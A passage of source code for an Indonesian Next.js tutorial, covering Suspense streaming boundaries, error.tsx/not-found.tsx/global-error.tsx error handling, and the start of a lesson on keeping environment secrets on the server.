                <Rekomendasi />
              </Suspense>
            </>
          );
        }

        // Tiap komponen mengambil datanya SENDIRI.
        async function GrafikTren() {
          const tren = await ambilTren();      // 2 detik, tidak menahan yang lain
          return <Grafik data={tren} />;
        }
        `,
        { filename: 'app/dasbor/page.tsx' },
      ),
      p(
        'Yang menentukan adalah **letak batas Suspense**. Bagian yang di-`await` langsung di komponen halaman menahan seluruh halaman, sedangkan bagian yang berada di dalam batas Suspense tidak. Karena itu ringkasan yang cepat sengaja ditunggu, dan tiga yang lambat dibungkus masing-masing.',
      ),
      p(
        'Membungkus ketiganya dengan **satu** batas Suspense akan membuat ketiganya menunggu yang terlambat. Batas terpisah membuat masing-masing tampil begitu siap. Ini keputusan yang sering keliru diambil, dan gejalanya berupa dua bagian cepat yang tertahan oleh satu bagian lambat.',
      ),
      code(
        'tsx',
        `
        // loading.tsx: batas Suspense OTOMATIS untuk seluruh rute.
        // Dipakai saat berpindah ke rute ini, sebelum halamannya siap.
        export default function Memuat() {
          return <SkeletonDasbor />;
        }
        `,
        { filename: 'app/dasbor/loading.tsx' },
      ),
      p(
        'Berkas `loading.tsx` adalah jalan pintas yang membungkus seluruh halaman dengan Suspense tanpa kamu menulisnya. Ia berguna sebagai jaring pengaman untuk perpindahan rute, dan ia **tidak** menggantikan batas Suspense per bagian. Kalau hanya mengandalkan `loading.tsx`, seluruh halaman tetap menunggu bagian terlambat.',
      ),
      p(
        'Yang perlu diperhatikan pada isi fallback, bentuknya harus **menyerupai isi aslinya**. Skeleton yang ukurannya jauh berbeda justru menambah pergeseran tata letak saat isinya tiba, dan itu masalah yang sudah diukur di Bab 4 Frontend Basic. Skeleton yang seukuran isi sungguhannya menghapus pergeseran itu sepenuhnya.',
      ),
      callout(
        'warning',
        'Streaming tidak mempercepat apa pun, ia mengubah urutan tampilnya',
        'Grafik yang butuh dua detik tetap butuh dua detik. Yang berubah adalah ringkasan dan daftar pesanan tidak lagi ikut menunggu. Kalau seluruh bagian halamanmu sama lambatnya, streaming tidak banyak menolong dan yang dibutuhkan adalah mempercepat pengambilan datanya.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering, dan sebagian besarnya berupa halaman yang tetap lambat meski Suspense sudah dipasang.',
      ),
      code(
        'text',
        `
        export default async function Dasbor() {
          const tren = await ambilTren();          // 2 detik, di komponen halaman
          return (
            <Suspense fallback={<Skeleton />}>
              <Grafik data={tren} />
            </Suspense>
          );
        }

        # Suspense tidak menolong sama sekali.
        # Halaman tetap kosong selama dua detik.
        `,
        { caption: 'Data ditunggu di luar batas Suspense.' },
      ),
      p(
        'Ini kesalahan paling sering dan paling sulit dilihat, sebab `Suspense`-nya memang ada. Yang salah adalah letak `await`-nya, yaitu di komponen halaman sehingga ia menahan seluruhnya sebelum Suspense sempat berperan. Pindahkan pengambilan datanya **ke dalam** komponen yang dibungkus, seperti pada studi kasus.',
      ),
      code(
        'text',
        `
        <Suspense fallback={<Skeleton />}>
          <Ringkasan />      {/* 100 ms */}
          <Grafik />         {/* 2 detik */}
          <Pesanan />        {/* 200 ms */}
        </Suspense>

        # Ketiganya tampil bersamaan setelah 2 detik.
        `,
        { caption: 'Satu batas untuk beberapa bagian dengan kecepatan berbeda.' },
      ),
      p(
        'Satu batas Suspense berarti satu keputusan, yaitu seluruh isinya tampil bersamaan setelah semuanya siap. Untuk bagian yang kecepatannya berbeda jauh, itu berarti yang cepat ikut menunggu. Bungkus masing-masing dengan batas sendiri, dan hanya satukan bagian yang memang harus tampil bersamaan.',
      ),
      code(
        'text',
        `
        # Grafik tiba. Seluruh isi di bawahnya melompat 300 piksel.

        # Skeleton tingginya 80 piksel, grafiknya 380 piksel.
        `,
        { caption: 'Fallback tidak seukuran isi aslinya.' },
      ),
      p(
        'Tidak ada error, dan skor pergeseran tata letaknya memburuk. Ini justru lebih mengganggu daripada tidak ada skeleton, sebab pergeserannya terjadi setelah pengguna sempat mulai membaca. Ukur isi aslinya lalu samakan tinggi fallbacknya, dan untuk isi yang tingginya bervariasi pakai tinggi minimum yang masuk akal.',
      ),
      code(
        'text',
        `
        # Grafik gagal dimuat karena layanan pihak ketiga mati.

        # SELURUH halaman diganti pesan galat,
        # padahal tiga bagian lain baik-baik saja.
        `,
        { caption: 'Tidak ada batas galat per bagian.' },
      ),
      p(
        'Suspense menangani bagian yang sedang dimuat, dan tidak menangani bagian yang gagal. Untuk itu dibutuhkan error boundary di sekitar tiap bagian, dan di App Router berkas `error.tsx` menyediakannya per rute. Untuk per bagian, pasang komponen batas galat sendiri seperti dibahas di bab jenis komponen. Tanpa itu, satu bagian yang gagal menjatuhkan seluruh halaman.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Suspense dipasang dan halaman tetap kosong',
            '`await` berada di komponen halaman, di luar batasnya',
            'Pindahkan pengambilan data ke dalam komponen yang dibungkus',
          ],
          [
            'Bagian cepat ikut menunggu yang lambat',
            'Beberapa bagian dibungkus satu batas',
            'Bungkus masing-masing dengan batas sendiri',
          ],
          [
            'Isi halaman melompat saat bagian tiba',
            'Fallback tidak seukuran isi aslinya',
            'Samakan tingginya, atau beri tinggi minimum',
          ],
          [
            'Satu bagian gagal menjatuhkan seluruh halaman',
            'Tidak ada batas galat per bagian',
            'Pasang error boundary di sekitar tiap bagian',
          ],
          [
            'Streaming tidak terasa membantu',
            'Seluruh bagian sama lambatnya',
            'Percepat pengambilan datanya, streaming hanya mengubah urutan',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Streaming terlihat seperti pengoptimalan otomatis, dan hasilnya sangat bergantung pada di mana batasnya diletakkan.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menunggu data di komponen halaman lalu membungkus hasilnya',
            'Suspense-nya kan sudah ada',
            'Batas Suspense tidak berperan sebab datanya sudah ditunggu sebelum ia tercapai',
          ],
          [
            'Membungkus seluruh halaman dengan satu batas',
            'Lebih sederhana',
            'Seluruh bagian menunggu yang terlambat. Pisahkan per bagian',
          ],
          [
            'Mengandalkan `loading.tsx` saja',
            'Sudah ada tampilan memuatnya',
            'Ia membungkus seluruh halaman. Tetap butuh batas per bagian untuk streaming yang sesungguhnya',
          ],
          [
            'Membuat fallback yang bentuknya asal',
            'Yang penting ada tandanya',
            'Ukuran yang berbeda menambah pergeseran tata letak. Samakan dengan isi aslinya',
          ],
          [
            'Melupakan batas galat',
            'Suspense sudah menangani',
            'Suspense untuk yang sedang dimuat, bukan yang gagal. Satu bagian gagal menjatuhkan seluruhnya',
          ],
          [
            'Mengira streaming mempercepat pengambilan data',
            'Halamannya terasa lebih cepat',
            'Yang berubah hanya urutan tampilnya. Kalau semuanya lambat, percepat datanya',
          ],
        ],
      ),
      p(
        'Baris pertama layak diperiksa setiap kali Suspense terasa tidak berpengaruh. Aturannya sederhana, yaitu `await` harus berada **di dalam** komponen yang dibungkus, bukan di komponen yang membungkusnya. Kalau kamu menunggu datanya lalu mengirimkannya sebagai props ke komponen di dalam Suspense, batasnya tidak akan pernah aktif.',
      ),
      callout(
        'tip',
        'Cara membuktikan streaming benar-benar bekerja',
        'Tambahkan penundaan buatan pada salah satu pengambilan data, misalnya tiga detik, lalu buka halamannya dengan pembatas jaringan aktif. Kalau bagian lain tampil lebih dulu, streamingnya bekerja. Kalau seluruh halaman menunggu tiga detik, ada `await` yang berada di luar batas Suspense.',
      ),
      references(
        {
          label: 'loading.js',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/loading',
          source: 'Next.js',
          note: 'Berkas konvensi yang otomatis menjadi Suspense boundary untuk satu segmen rute.',
        },
        {
          label: '<Suspense>',
          href: 'https://react.dev/reference/react/Suspense',
          source: 'React',
          note: 'Aturan penempatan boundary — penantiannya harus terjadi di dalamnya, bukan di induknya.',
        },
        {
          label: 'Streaming with Suspense',
          href: 'https://nextjs.org/docs/app/getting-started/fetching-data#streaming',
          source: 'Next.js',
          note: 'Cara Next.js mengirim HTML bertahap dan menambal bagian yang lambat.',
        },
        {
          label: 'Cumulative Layout Shift (CLS)',
          href: 'https://web.dev/articles/cls',
          source: 'web.dev',
          note: 'Metrik yang langsung memburuk ketika skeleton tidak setinggi isi aslinya.',
        },
      ),

      h2('Kapan justru jangan memakai Suspense'),
      p(
        'Untuk operasi yang hampir selalu selesai di bawah 100ms, fallback yang berkedip sekejap terasa **lebih lambat** daripada tidak ada indikator sama sekali. Streaming berbayar untuk penantian yang benar-benar terasa, bukan untuk semua penantian.',
      ),
    ],
  ),

  written(
    'error-handling-next',
    'Penanganan Error: `error.tsx` & `not-found.tsx`',
    20,
    'Kegagalan yang tetap ramah bagi pembaca.',
    [
      p(
        'App Router punya dua berkas khusus untuk kegagalan. Keduanya bekerja per segmen rute, sehingga error di satu bagian tidak menghapus seluruh aplikasi.',
      ),

      terms(
        {
          term: 'error.tsx',
          meaning:
            'Berkas konvensi yang otomatis menjadi **Error Boundary** untuk satu segmen rute. Ia **wajib** Client Component (`"use client"`), karena Error Boundary hanya bisa ditulis sebagai class component yang berjalan di browser.',
        },
        {
          term: 'reset',
          meaning:
            'Fungsi yang diterima `error.tsx` sebagai prop. Memanggilnya membuat React mencoba melakukan re-render segmen yang gagal — inilah yang menjadikan tombol "Coba lagi" benar-benar berfungsi, bukan sekadar memuat ulang halaman.',
        },
        {
          term: 'digest',
          meaning:
            'Kode acak pendek yang Next.js tempelkan ke error di produksi, dan yang **sama** dengan yang tercatat di log server. Ia aman ditampilkan ke pengguna: ia tidak membocorkan apa pun, tapi memungkinkan kamu mencocokkan laporan mereka dengan log.',
        },
        {
          term: 'error.message',
          meaning:
            'Isi pesan error asli — dan yang **tidak boleh** kamu tampilkan di produksi. Ia bisa memuat nama tabel, jalur berkas, potongan query, atau detail konfigurasi. Next.js sudah menyamarkannya; jangan membuka kembali celah itu sendiri.',
        },
        {
          term: 'global-error.tsx',
          meaning:
            'Penangkap error yang terjadi di **root layout** itu sendiri. Karena ia menggantikan seluruh root layout, ia **harus** punya tag `<html>` dan `<body>` sendiri — satu-satunya berkas selain root layout yang begitu.',
        },
        {
          term: 'notFound()',
          meaning:
            'Fungsi yang melempar error khusus, ditangkap oleh `not-found.tsx` terdekat. Bentuk ini lebih bersih daripada `if` bercabang yang mengembalikan JSX berbeda — halaman 404-nya jadi satu tempat, bukan tersebar di tiap pemanggil.',
        },
        {
          term: 'not-found.tsx',
          meaning:
            'Tampilan 404 untuk satu segmen rute. Berbeda dari `error.tsx`, ia **tidak perlu** `"use client"` — ia Server Component biasa, karena tidak menangkap apa pun, hanya menampilkan.',
        },
        {
          term: 'jalan keluar',
          meaning:
            'Syarat keadaan error yang baik: pengguna harus punya **sesuatu untuk dilakukan**. Tombol coba lagi, satu tautan ke tempat yang pasti aman, dan penjelasan dalam bahasa yang bisa dipahami. Area kosong tanpa penjelasan bukan penanganan error.',
        },
        {
          term: 'role="alert"',
          meaning:
            'Membuat screen reader **mengumumkan** isi elemen begitu muncul, memotong pembacaan lain. Tepat untuk pesan kegagalan: pengguna perlu tahu sekarang, bukan setelah ia kebetulan menjelajah ke bagian itu.',
        },
      ),

      h2('`error.tsx`'),
      code(
        'tsx',
        `
        'use client';   // WAJIB — Error Boundary hanya bisa di klien

        export default function Error({
          error,
          reset,
        }: {
          error: Error & { digest?: string };
          reset: () => void;
        }) {
          useEffect(() => {
            laporkan(error);
          }, [error]);

          return (
            <div role="alert">
              <h2>Ada yang tidak beres.</h2>
              <p>Bagian ini gagal dimuat. Coba lagi, atau kembali ke daftar kelas.</p>

              {/* Jangan pernah menampilkan error.message ke pengguna —
                  ia bisa memuat detail internal. digest aman: ia hanya id
                  untuk mencocokkan dengan log server. */}
              {error.digest !== undefined && <p>Kode: {error.digest}</p>}

              <button onClick={reset}>Coba lagi</button>
            </div>
          );
        }
        `,
      ),
      callout(
        'danger',
        'Jangan tampilkan `error.message` di produksi',
        'Pesan error bisa memuat nama tabel, jalur berkas, potongan query, atau detail konfigurasi. Next.js sudah menyamarkan pesan error server di produksi dan menggantinya dengan `digest`; jangan membuka kembali celah itu dengan menampilkannya sendiri.',
      ),

      h2('`global-error.tsx`'),
      code(
        'tsx',
        `
        'use client';

        // Menggantikan seluruh root layout, jadi ia HARUS punya <html> dan <body>.
        export default function GlobalError({ reset }: { reset: () => void }) {
          return (
            <html lang="id">
              <body>
                <h2>Terjadi kesalahan.</h2>
                <button onClick={reset}>Muat ulang</button>
              </body>
            </html>
          );
        }
        `,
      ),
      p(
        'Komentarnya menyebut hal yang paling mudah terlewat, yaitu `global-error.tsx` **menggantikan root layout** alih-alih berada di dalamnya, sehingga ia wajib merender `<html>` dan `<body>` sendiri. Itu masuk akal begitu kamu tahu kapan ia dipakai, sebab ia hanya muncul ketika **root layout itu sendiri yang gagal**, dan pada saat itu tidak ada pembungkus apa pun yang bisa diandalkan. Konsekuensinya, isinya harus sesederhana mungkin, karena navigasi, tema, dan provider apa pun sudah tidak tersedia. Perhatikan juga ia menerima `reset` tapi tidak menampilkan `error.message`, konsisten dengan aturan sebelumnya. Dan seperti `error.tsx`, ia wajib Client Component karena tombolnya butuh `onClick`.',
      ),

      h2('`not-found.tsx` dan `notFound()`'),
      code(
        'tsx',
        `
        import { notFound } from 'next/navigation';

        export default async function HalamanPelajaran({ params }) {
          const { lesson } = await params;
          const isi = cariPelajaran(lesson);

          // Melempar error khusus yang ditangkap not-found.tsx terdekat.
          if (isi === undefined) notFound();

          return <Pelajaran isi={isi} />;
        }
        `,
      ),
      code(
        'tsx',
        `
        // app/kelas/not-found.tsx — Server Component, tidak perlu 'use client'
        export default function TidakDitemukan() {
          return (
            <div>
              <h2>Materi tidak ditemukan</h2>
              <p>Tautannya mungkin sudah berubah.</p>
              <Link href="/kelas">Lihat semua kelas</Link>
            </div>
          );
        }
        `,
      ),
      p(
        'Dua blok kode di atas adalah dua sisi dari satu mekanisme. Memanggil `notFound()` di `HalamanPelajaran` **tidak** langsung merender sesuatu, sebab ia melempar sinyal khusus yang membatalkan render halaman itu, lalu Next.js mencari berkas `not-found.tsx` terdekat naik ke atas dari segmen rute tempat `notFound()` dipanggil, dan merender itu sebagai gantinya. "Terdekat" di sini berarti kalau `app/kelas/[category]/not-found.tsx` tidak ada, Next.js naik ke `app/kelas/not-found.tsx`, lalu ke `app/not-found.tsx` di root kalau perlu. Berbeda dari `error.tsx`, `TidakDitemukan` di atas **tidak perlu** `"use client"`, sebab ia Server Component biasa yang tugasnya cuma menampilkan pesan statis, bukan menangkap sebuah error yang terjadi di browser.',
      ),

      h2('Yang TIDAK ditangkap `error.tsx`'),
      table(
        ['Kasus', 'Ditangani oleh'],
        [
          ['Error saat render halaman', '`error.tsx` segmen itu'],
          ['Error di root layout', '`global-error.tsx`'],
          ['`notFound()` dipanggil', '`not-found.tsx`'],
          ['Error di event handler', '`try/catch` sendiri'],
          ['Error di Server Action', 'Kembalikan sebagai nilai, jangan lempar'],
          ['Error di Route Handler', '`try/catch` + status code yang tepat'],
        ],
      ),

      h2('Keadaan error yang baik selalu punya jalan keluar'),
      ul(
        'Jelaskan apa yang gagal dengan bahasa yang bisa dipahami — bukan kode teknis.',
        'Sediakan tombol coba lagi (`reset`).',
        'Sediakan satu tautan ke tempat yang pasti aman.',
        'Pakai `role="alert"` agar screen reader mengumumkannya.',
        'Jangan pernah membiarkan area kosong tanpa penjelasan.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Layanan rekomendasi pihak ketiga mati selama dua jam. Selama itu, seluruh halaman produk menampilkan layar galat dan tidak seorang pun bisa membeli apa pun, padahal data produk, harga, dan stok semuanya baik-baik saja. Satu bagian yang gagal menjatuhkan halaman yang sembilan puluh persennya masih berguna.',
      ),
      p(
        'App Router menyediakan dua berkas konvensi untuk ini, dan keduanya punya cakupan yang berbeda.',
      ),
      table(
        ['Berkas', 'Menangkap', 'Wajib Client Component?'],
        [
          ['`error.tsx`', 'Galat di rute itu dan anaknya', '**Ya**'],
          ['`global-error.tsx`', 'Galat di layout akar itu sendiri', '**Ya**'],
          ['`not-found.tsx`', 'Pemanggilan `notFound()`', 'Tidak'],
          ['Error boundary sendiri', 'Bagian tertentu di dalam halaman', 'Ya'],
        ],
        'Baris terakhir yang menyelesaikan cerita di awal, dan ia bukan konvensi berkas.',
      ),
      code(
        'tsx',
        `
        'use client';      // WAJIB. error.tsx selalu Client Component.

        export default function Galat({
          error,
          reset,
        }: {
          error: Error & { digest?: string };
          reset: () => void;
        }) {
          useEffect(() => {
            // Laporkan ke pemantauan. digest adalah pengenal galat di server.
            laporkan(error, { digest: error.digest });
          }, [error]);

          return (
            <div role="alert">
              <h2>Gagal memuat halaman ini</h2>
              <p>Coba lagi sebentar. Kalau berulang, hubungi kami.</p>
              {/* reset mencoba merender ulang bagian yang gagal. */}
              <button onClick={reset}>Coba lagi</button>
            </div>
          );
        }
        `,
        { filename: 'app/produk/error.tsx' },
      ),
      p(
        'Properti `digest` adalah bagian yang sering dilewatkan dan sangat berguna. Di produksi, Next.js **menyembunyikan** pesan galat asli dari klien demi keamanan, dan menggantinya dengan pengenal acak. Pengenal itu muncul juga di log server, sehingga kamu bisa mencocokkan laporan pengguna dengan galat yang sebenarnya. Tanpa mencatatnya, hubungan itu hilang.',
      ),
      p(
        'Fungsi `reset` mencoba merender ulang bagian yang gagal tanpa memuat ulang seluruh halaman. Untuk kegagalan sementara seperti jaringan terputus, ia sering langsung berhasil. Menyediakannya jauh lebih baik daripada hanya menampilkan pesan, sebab pengguna punya jalan keluar yang tidak menghilangkan keadaan halaman lainnya.',
      ),
      code(
        'tsx',
        `
        // Menyelesaikan cerita di awal: batas per BAGIAN, bukan per rute.
        export default async function HalamanProduk({ params }: Props) {
          const { id } = await params;
          const produk = await ambilProduk(id);
          if (!produk) notFound();

          return (
            <article>
              <DetailProduk produk={produk} />

              {/* Rekomendasi boleh gagal tanpa menjatuhkan halaman. */}
              <BatasGalat fallback={<p>Rekomendasi sedang tidak tersedia</p>}>
                <Suspense fallback={<SkeletonRekomendasi />}>
                  <Rekomendasi produkId={id} />
                </Suspense>
              </BatasGalat>
            </article>
          );
        }
        `,
        { filename: 'app/produk/[id]/page.tsx' },
      ),
      p(
        'Batas galat per bagian adalah yang menentukan seberapa besar kerusakannya. Berkas `error.tsx` menangkap galat untuk seluruh rute, sehingga satu bagian yang gagal tetap mengganti seluruh halaman. Batas di sekitar bagian yang boleh gagal membuat kerusakannya berhenti di sana, dan pembeli tetap bisa membeli.',
      ),
      p(
        'Yang perlu ditegaskan, batas galat **tidak** menangkap galat dari penangan peristiwa maupun dari kode asinkron di luar render. Ini sudah diukur di bab jenis komponen. Untuk kegagalan di dalam Server Action, tangani dengan mengembalikan keadaan galat dari aksinya, bukan dengan mengandalkan batas.',
      ),
      callout(
        'danger',
        'Jangan menampilkan pesan galat asli kepada pengguna',
        'Di produksi Next.js sudah menyembunyikannya, dan di pengembangan ia terlihat penuh. Kalau kamu menampilkan `error.message` mentah, pesan yang bocor bisa memuat nama tabel, jalur berkas, atau bagian kueri. Tampilkan pesan yang kamu tulis sendiri, dan kirim detailnya ke pemantauan lewat `digest`.',
      ),

      h2('Saat error-nya muncul'),
      p('Empat kegagalan berikut adalah yang paling sering pada penanganan galat di App Router.'),
      code(
        'text',
        `
        // app/produk/error.tsx tanpa 'use client'

        Error: The default export of error is not a React Component in "/produk"
        `,
        { caption: 'Berkas `error.tsx` wajib Client Component.' },
      ),
      p(
        'Alasannya, batas galat membutuhkan komponen kelas dengan lifecycle yang hanya bisa berjalan di klien. Ini salah satu dari sedikit berkas konvensi yang wajib ditandai. Kalau kamu lupa, pesannya menyebut ekspor bawaannya tidak dikenali sebagai komponen, dan itu petunjuk yang agak menyesatkan.',
      ),
      code(
        'text',
        `
        # Satu widget rekomendasi gagal.
        # SELURUH halaman diganti tampilan galat.

        # Hanya ada error.tsx di tingkat rute.
        `,
        { caption: 'Tidak ada batas galat per bagian.' },
      ),
      p(
        'Tidak ada error tambahan, dan yang rusak adalah cakupannya. Berkas `error.tsx` menangkap seluruh galat di rute itu, sehingga kegagalan sekecil apa pun mengganti seluruh halaman. Tambahkan batas di sekitar tiap bagian yang kegagalannya masih menyisakan halaman yang berguna.',
      ),
      code(
        'text',
        `
        # Galat terjadi di app/layout.tsx sendiri.
        # error.tsx tidak menangkapnya.

        # Yang dibutuhkan global-error.tsx, dan ia harus memuat html dan body.
        `,
        { caption: 'Galat di layout akar berada di luar jangkauan `error.tsx`.' },
      ),
      p(
        'Berkas `error.tsx` berada **di dalam** layout, sehingga ia tidak bisa menangkap galat dari layout itu sendiri. Untuk itu ada `global-error.tsx` yang menggantikan seluruh dokumen, dan karena itu ia wajib memuat tag `html` dan `body` sendiri. Ia jarang dibutuhkan, dan ketiadaannya berarti galat di layout akar menghasilkan halaman kosong.',
      ),
      code(
        'text',
        `
        <p>Terjadi kesalahan: {error.message}</p>

        # Di pengembangan: "Cannot read properties of null (reading 'harga')
        #   at ambilProduk (/src/lib/db.ts:42)"
        # Bocor ke pengguna kalau tidak sengaja terbawa ke produksi.
        `,
        { caption: 'Pesan galat asli ditampilkan ke pengguna.' },
      ),
      p(
        'Di produksi Next.js sudah menggantinya dengan pesan umum dan `digest`, sehingga risikonya berkurang. Yang tetap berbahaya adalah kebiasaannya, sebab pesan galat yang kamu lempar sendiri **tidak** disembunyikan. Melempar `new Error(\`Kueri gagal: ${sql}\`)` berarti kuerinya bisa sampai ke pengguna. Tampilkan pesan yang kamu tulis untuk pengguna, dan simpan detailnya di log.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`The default export of error is not a React Component`',
            '`error.tsx` tanpa `use client`',
            'Tambahkan penandanya di baris pertama',
          ],
          [
            'Satu bagian gagal menjatuhkan seluruh halaman',
            'Hanya ada batas di tingkat rute',
            'Tambahkan batas di sekitar tiap bagian yang boleh gagal',
          ],
          [
            'Galat di layout akar menghasilkan halaman kosong',
            '`error.tsx` tidak menjangkau layout akar',
            'Tambahkan `global-error.tsx` yang memuat `html` dan `body`',
          ],
          [
            'Pesan teknis terlihat pengguna',
            '`error.message` ditampilkan mentah',
            'Tampilkan pesan yang kamu tulis, kirim detail ke pemantauan',
          ],
          [
            'Laporan pengguna tidak bisa dicocokkan dengan log',
            '`digest` tidak dicatat',
            'Catat `error.digest` saat melapor ke pemantauan',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Penanganan galat sering dipasang sebagai formalitas di satu tempat, dan di situ ia memberi manfaat paling sedikit.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Hanya memasang `error.tsx` di tingkat rute',
            'Semua galat tertangkap',
            'Kegagalan sekecil apa pun mengganti seluruh halaman. Tambahkan batas per bagian',
          ],
          [
            'Melupakan `use client` pada `error.tsx`',
            'Konsisten dengan berkas lain',
            'Ia wajib Client Component. Tanpa itu buildnya gagal',
          ],
          [
            'Menampilkan `error.message` mentah',
            'Supaya jelas apa yang salah',
            'Pesan yang kamu lempar sendiri tidak disembunyikan dan bisa memuat detail internal',
          ],
          [
            'Tidak menyediakan tombol coba lagi',
            'Pengguna bisa memuat ulang halaman',
            'Memuat ulang menghilangkan seluruh keadaan halaman. Prop `reset` mencoba ulang bagian yang gagal saja',
          ],
          [
            'Tidak melaporkan galat ke pemantauan',
            'Tampilan galatnya sudah muncul',
            'Kamu tidak akan pernah tahu ada kegagalan. Catat di efek, beserta `digest`',
          ],
          [
            'Memakai batas galat untuk kegagalan yang bisa diperkirakan',
            'Lebih sedikit kode',
            'Data yang tidak ditemukan lebih tepat lewat `notFound()`, dan validasi lewat keadaan biasa. Batas untuk yang tidak terduga',
          ],
        ],
      ),
      p(
        'Baris terakhir menunjuk pembedaan yang penting. Produk yang tidak ada bukan hal yang tidak terduga melainkan keadaan yang wajar, dan `notFound()` yang memicu `not-found.tsx` jauh lebih tepat daripada melemparnya ke batas galat. Batas galat adalah jaring pengaman untuk hal yang **tidak** kamu perkirakan, dan kalau ia sering aktif itu tanda ada keadaan yang seharusnya ditangani secara eksplisit.',
      ),
      callout(
        'tip',
        'Uji batasmu dengan sengaja melempar',
        'Tambahkan satu baris yang melempar di komponen yang dibungkus, lalu buka halamannya. Perhatikan apakah fallbacknya tampil, apakah bagian lain halaman tetap berfungsi, dan apakah tombol coba lagi bekerja. Tanpa pengujian itu, kamu tidak tahu batasmu benar-benar bekerja sampai kegagalan sungguhan terjadi di produksi.',
      ),
      references(
        {
          label: 'error.js',
          href: 'https://nextjs.org/docs/app/api-reference/file-conventions/error',
          source: 'Next.js',
          note: 'Prop `error` dan `reset`, arti `digest`, serta kewajiban `"use client"`.',
        },
        {
          label: 'not-found.js & notFound()',
          href: 'https://nextjs.org/docs/app/api-reference/functions/not-found',
          source: 'Next.js',
          note: 'Melempar 404 dari dalam Server Component tanpa bercabang JSX.',
        },
        {
          label: 'Error Handling',
          href: 'https://nextjs.org/docs/app/getting-started/error-handling',
          source: 'Next.js',
          note: 'Peta lengkap error mana ditangkap berkas mana — dan mana yang harus kamu tangani sendiri.',
        },
        {
          label: 'ARIA: alert role',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Roles/alert_role',
          source: 'MDN Web Docs',
          note: 'Membuat pesan kegagalan diumumkan screen reader begitu muncul.',
        },
      ),
    ],
  ),

  written(
    'env-batas-server-klien',
    'Environment Variable & Batas Server/Client',
    19,
    'Tempat rahasia paling sering bocor.',
    [
      p(
        'Ini sub-bab terpendek yang paling mahal kalau diabaikan. Kebocoran rahasia di aplikasi Next.js hampir selalu terjadi lewat satu dari tiga jalur di bawah — dan ketiganya mudah dihindari begitu kamu tahu.',
      ),

      terms(
        {
          term: 'environment variable',
          meaning:
            'Nilai konfigurasi yang datang dari **luar kode** — biasanya berkas `.env` saat pengembangan, dan disuntikkan platform saat produksi. Gunanya supaya nilai yang berbeda per lingkungan (dan yang rahasia) tidak pernah ikut tertulis di source.',
        },
        {
          term: '.env.local',
          meaning:
            'Berkas tempat menaruh nilai untuk mesinmu sendiri. **Wajib** masuk `.gitignore`. Yang boleh di-commit hanya `.env.example` berisi placeholder **kosong** — bukan nilai asli "sebagai contoh", yang justru bentuk kebocoran paling sering.',
        },
        {
          term: 'NEXT_PUBLIC_',
          meaning:
            'Prefiks yang berarti "nilai ini ditanam ke JavaScript yang diunduh browser". Kalimatnya harus tegas: **`NEXT_PUBLIC_` berarti publik, tanpa pengecualian.** Tidak ada "rahasia yang cuma dipakai untuk memanggil API" — kalau ia di bundle, ia bukan rahasia.',
        },
        {
          term: 'jalur kebocoran',
          meaning:
            'Tiga cara rahasia bocor di aplikasi Next.js: prefiks yang salah, rahasia dibaca dari Client Component, dan objek server dioper mentah sebagai props. Ketiganya mudah dihindari begitu kamu tahu bentuknya.',
        },
        {
          term: 'server-only',
          meaning:
            'Paket yang membuat **build gagal** kalau sebuah berkas terimpor dari komponen klien. Nilainya: ia mengubah kesalahan diam menjadi kegagalan yang terlihat. Pasangannya `client-only` mencegah modul yang butuh `window` terimpor di server.',
        },
        {
          term: 'fail loudly saat boot',
          meaning:
            'Aplikasi menolak menyala kalau konfigurasinya kurang atau cacat, dengan pesan yang jelas. Ini jauh lebih mudah diperbaiki daripada aplikasi yang menyala lalu gagal misterius saat pengguna pertama datang.',
        },
        {
          term: 'z.string().url()',
          meaning:
            'Contoh validasi konfigurasi dengan Zod. Ia tidak sekadar memeriksa "ada atau tidak", tapi juga **bentuknya** — `DATABASE_URL` harus URL sungguhan, `API_SECRET` minimal 32 karakter. Kesalahan ketik tertangkap saat start, bukan saat produksi.',
        },
        {
          term: 'rotasi rahasia',
          meaning:
            'Mengganti nilai rahasia dengan yang baru. Aturan yang tidak bisa ditawar, rahasia yang **pernah** ter-commit dan ter-push dianggap **bocor**, sebab ia sudah ada di setiap clone, setiap fork, dan kemungkinan besar sudah terindeks. Menulis ulang riwayat git tidak menariknya kembali, dan satu-satunya perbaikan yang benar adalah merotasinya.',
        },
      ),

      h2('Aturan prefiks'),
      code(
        'bash',
        `
        # .env.local — WAJIB masuk .gitignore

        # Hanya bisa dibaca di server. Aman.
        DATABASE_URL="postgresql://..."
        API_SECRET="rahasia-sungguhan"

        # Ikut ke bundle browser. Bisa dibaca SIAPA PUN.
        NEXT_PUBLIC_SITE_URL="https://contoh.com"
        `,
      ),
      p(
        'Satu prefiks memisahkan dua dunia yang sangat berbeda, dan tidak ada mekanisme lain yang mengaturnya. Dua baris pertama tetap tinggal di server, karena nilainya dibaca saat kode server berjalan dan **tidak pernah** ikut ke berkas JavaScript yang diunduh browser. Baris terakhir sebaliknya ditanam langsung ke dalam bundle saat build, jadi bukan diambil saat berjalan melainkan **disalin ke dalam kodenya**. Itu sebabnya nilainya bisa dibaca siapa pun yang membuka DevTools, dan itu pula sebabnya mengubahnya menuntut build ulang. Perhatikan komentar `.gitignore` di baris pertama, sebab berkas ini menyimpan rahasia sungguhan sehingga tidak boleh masuk repositori. Seperti disebut di kotak istilah, rahasia yang pernah ter-push harus dianggap bocor dan dirotasi, bukan sekadar dihapus dari riwayat.',
      ),
      callout(
        'danger',
        '`NEXT_PUBLIC_` berarti publik — tanpa pengecualian',
        'Nilai di belakang prefiks itu ditanam ke dalam JavaScript yang diunduh browser. Siapa pun bisa membacanya dengan membuka DevTools. Tidak ada "rahasia yang cuma dipakai untuk memanggil API" — kalau ia di bundle, ia bukan rahasia.',
      ),

      h2('Tiga jalur kebocoran'),
      ol(
